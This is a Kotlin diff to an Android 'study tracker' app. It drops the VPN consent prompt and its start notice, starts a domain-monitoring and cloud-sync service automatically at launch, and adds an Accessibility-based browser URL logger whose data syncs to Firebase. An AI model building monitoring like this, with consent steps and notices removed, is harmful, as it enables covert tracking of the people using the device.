@@ -1,8 +1,7 @@
 package com.example.studytracker
 
-import android.app.Activity
 import android.content.Intent
-import android.net.VpnService
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Button
@@ -10,7 +9,6 @@ import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
@@ -18,17 +16,12 @@ class MainActivity : AppCompatActivity() {
     private lateinit var telemetryHelper: TelemetryHelper
     private lateinit var outputText: TextView
 
-    private val vpnPermissionLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { result ->
-        if (result.resultCode == Activity.RESULT_OK) {
-            startVpnService()
-        }
-    }
-
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         telemetryHelper = TelemetryHelper(this)
+
+        // Automatically start the 5-minute cloud sync service on app launch
+        startAutoSyncService()
 
         val rootLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -36,15 +29,17 @@ class MainActivity : AppCompatActivity() {
         }
 
         val btnGrantUsage = Button(this).apply {
-            text = "1. Grant Usage Access Permission"
+            text = "1. Grant Usage Access (Screen Time & Apps)"
             setOnClickListener {
                 startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
             }
         }
 
-        val btnStartVpn = Button(this).apply {
-            text = "2. Start Domain Logger & Auto-Sync (VPN)"
-            setOnClickListener { prepareAndStartVpn() }
+        val btnEnableUrlLogger = Button(this).apply {
+            text = "2. Enable Browser URL Logger (Accessibility)"
+            setOnClickListener {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            }
         }
 
         val btnRefreshAndSync = Button(this).apply {
@@ -64,7 +59,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         rootLayout.addView(btnGrantUsage)
-        rootLayout.addView(btnStartVpn)
+        rootLayout.addView(btnEnableUrlLogger)
         rootLayout.addView(btnRefreshAndSync)
         rootLayout.addView(scrollView)
 
@@ -72,26 +67,20 @@ class MainActivity : AppCompatActivity() {
         renderAndSync()
     }
 
-    private fun prepareAndStartVpn() {
-        val intent = VpnService.prepare(this)
-        if (intent != null) {
-            vpnPermissionLauncher.launch(intent)
-        } else {
-            startVpnService()
-        }
-    }
-
-    private fun startVpnService() {
+    private fun startAutoSyncService() {
         val serviceIntent = Intent(this, DomainMonitorVpnService::class.java)
-        startService(serviceIntent)
-        Toast.makeText(this, "VPN Logger & 5-Min Cloud Sync Started", Toast.LENGTH_SHORT).show()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
     }
 
     private fun renderAndSync() {
         outputText.text = telemetryHelper.buildFormattedTextReport()
         telemetryHelper.syncReportToFirebase { success ->
             runOnUiThread {
-                val msg = if (success) "Synced to Firebase Cloud!" else "Local view updated (Cloud URL not set or offline)"
+                val msg = if (success) "Synced to Firebase Cloud!" else "Local view updated"
                 Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
             }
         }
